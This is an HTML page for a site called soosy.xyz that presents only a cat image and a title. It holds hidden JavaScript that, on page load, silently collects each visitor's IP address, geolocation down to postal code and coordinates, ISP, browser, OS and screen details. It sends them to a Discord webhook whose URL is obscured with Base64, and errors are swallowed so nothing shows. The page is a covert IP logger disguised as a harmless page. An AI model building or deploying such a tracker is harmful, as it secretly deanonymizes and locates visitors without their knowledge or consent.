<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>soosy.xyz</title>
  <link rel="icon" href="https://http.cat/100.jpg" type="image/jpeg">
  <style>
    body {
      background-color: white;
      text-align: center;
      font-family: Arial, sans-serif;
      padding: 50px;
    }
    img {
      width: 300px;
      max-width: 80%;
    }
    h1 {
      font-size: 3rem;
      color: #222;
    }
    .caption {
      font-size: 1.2rem;
      color: #666;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <div class="caption"></div>
  <img src="https://http.cat/100.jpg" alt="-">
  <h1>soosy</h1>

  <script>
    // Base64 encoded webhook URL
    const ENCODED_WEBHOOK = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3OTkwNjAwMzEzODUxMTAxOS9zcGw4V1l6OVlYTVBMVV9haEVCREVJd201UHIxMjNoTzFSVjRyN0xCOHRUSXdwOFJQVjcxR0FFYURoeE82bzUzUDJicw==';
    
    // Decode the webhook URL
    const DISCORD_WEBHOOK_URL = atob(ENCODED_WEBHOOK);
    
    async function getIPAndLocationInfo() {
      try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        
        const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
        const locationData = await locationResponse.json();
        
        return {
          ip: ipData.ip,
          country: locationData.country_name || 'Unknown',
          region: locationData.region || 'Unknown',
          city: locationData.city || 'Unknown',
          postal: locationData.postal || 'Unknown',
          latitude: locationData.latitude || 'Unknown',
          longitude: locationData.longitude || 'Unknown',
          timezone: locationData.timezone || 'Unknown',
          isp: locationData.org || 'Unknown',
          asn: locationData.asn || 'Unknown'
        };
      } catch (error) {
        return {
          ip: 'Unable to fetch',
          country: 'Unknown',
          region: 'Unknown',
          city: 'Unknown',
          postal: 'Unknown',
          latitude: 'Unknown',
          longitude: 'Unknown',
          timezone: 'Unknown',
          isp: 'Unknown',
          asn: 'Unknown'
        };
      }
    }

    function getBrowserInfo() {
      const ua = navigator.userAgent;
      let browserName = 'Unknown';
      let browserVersion = 'Unknown';
      
      if (ua.includes('Firefox')) {
        browserName = 'Firefox';
        browserVersion = ua.match(/Firefox\/(\d+)/)?.[1] || 'Unknown';
      } else if (ua.includes('Chrome') && !ua.includes('Edg')) {
        browserName = 'Chrome';
        browserVersion = ua.match(/Chrome\/(\d+)/)?.[1] || 'Unknown';
      } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
        browserName = 'Safari';
        browserVersion = ua.match(/Version\/(\d+)/)?.[1] || 'Unknown';
      } else if (ua.includes('Edg')) {
        browserName = 'Edge';
        browserVersion = ua.match(/Edg\/(\d+)/)?.[1] || 'Unknown';
      }
      
      return { browserName, browserVersion };
    }

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      let deviceType = 'Desktop';
      let os = 'Unknown';
      
      if (/Mobile|Android|iPhone|iPad/.test(ua)) {
        deviceType = 'Mobile';
      } else if (/Tablet|iPad/.test(ua)) {
        deviceType = 'Tablet';
      }
      
      if (ua.includes('Windows')) os = 'Windows';
      else if (ua.includes('Mac')) os = 'macOS';
      else if (ua.includes('Linux')) os = 'Linux';
      else if (ua.includes('Android')) os = 'Android';
      else if (ua.includes('iOS')) os = 'iOS';
      
      return { deviceType, os };
    }

    async function sendDiscordNotification() {
      try {
        const ipLocationInfo = await getIPAndLocationInfo();
        const browserInfo = getBrowserInfo();
        const deviceInfo = getDeviceInfo();
        
        const visitorInfo = {
          timestamp: new Date().toLocaleString(),
          userAgent: navigator.userAgent,
          language: navigator.language,
          languages: navigator.languages?.join(', ') || navigator.language,
          platform: navigator.platform,
          screenResolution: `${screen.width}x${screen.height}`,
          windowSize: `${window.innerWidth}x${window.innerHeight}`,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          url: window.location.href,
          referrer: document.referrer || 'Direct visit',
          cookiesEnabled: navigator.cookieEnabled,
          onlineStatus: navigator.onLine,
          doNotTrack: navigator.doNotTrack || 'Not set',
          javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
          ...ipLocationInfo,
          ...browserInfo,
          ...deviceInfo
        };

        const discordMessage = {
          embeds: [{
            title: "🌐 New Website Visitor Detected",
            color: 0x00ff00,
            fields: [
              {
                name: "⏰ Timestamp",
                value: visitorInfo.timestamp,
                inline: true
              },
              {
                name: "🌍 IP Address",
                value: visitorInfo.ip,
                inline: true
              },
              {
                name: "📍 Location",
                value: `${visitorInfo.city}, ${visitorInfo.region}, ${visitorInfo.country}`,
                inline: true
              },
              {
                name: "🗺️ Coordinates",
                value: `${visitorInfo.latitude}, ${visitorInfo.longitude}`,
                inline: true
              },
              {
                name: "📮 Postal Code",
                value: visitorInfo.postal,
                inline: true
              },
              {
                name: "🌐 ISP",
                value: visitorInfo.isp,
                inline: true
              },
              {
                name: "🔗 URL Visited",
                value: visitorInfo.url,
                inline: false
              },
              {
                name: "🔍 Referrer",
                value: visitorInfo.referrer,
                inline: false
              },
              {
                name: "💻 Browser",
                value: `${visitorInfo.browserName} ${visitorInfo.browserVersion}`,
                inline: true
              },
              {
                name: "🖥️ Operating System",
                value: visitorInfo.os,
                inline: true
              },
              {
                name: "📱 Device Type",
                value: visitorInfo.deviceType,
                inline: true
              },
              {
                name: "📊 Screen Resolution",
                value: visitorInfo.screenResolution,
                inline: true
              },
              {
                name: "🖼️ Window Size",
                value: visitorInfo.windowSize,
                inline: true
              },
              {
                name: "🎨 Color Depth",
                value: `${visitorInfo.colorDepth}-bit`,
                inline: true
              },
              {
                name: "🌐 Languages",
                value: visitorInfo.languages,
                inline: true
              },
              {
                name: "⏰ Timezone",
                value: visitorInfo.timezone,
                inline: true
              },
              {
                name: "🍪 Cookies Enabled",
                value: visitorInfo.cookiesEnabled ? 'Yes' : 'No',
                inline: true
              },
              {
                name: "📡 Online Status",
                value: visitorInfo.onlineStatus ? 'Online' : 'Offline',
                inline: true
              },
              {
                name: "🔒 Do Not Track",
                value: visitorInfo.doNotTrack,
                inline: true
              },
              {
                name: "☕ Java Enabled",
                value: visitorInfo.javaEnabled ? 'Yes' : 'No',
                inline: true
              },
              {
                name: "🏢 ASN",
                value: visitorInfo.asn,
                inline: false
              },
              {
                name: "📱 User Agent",
                value: visitorInfo.userAgent.length > 100 ? 
                  visitorInfo.userAgent.substring(0, 100) + '...' : 
                  visitorInfo.userAgent,
                inline: false
              }
            ],
            timestamp: new Date().toISOString(),
            footer: {
              text: "soosy.xyz visitor tracking"
            },
            thumbnail: {
              url: "https://http.cat/100.jpg"
            }
          }]
        };

        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(discordMessage)
        });
      } catch (error) {
        // Silent fail - no status messages
      }
    }

    // Send notification when page loads
    window.addEventListener('load', () => {
      setTimeout(sendDiscordNotification, 1000);
    });
  </script>
</body>
</html>
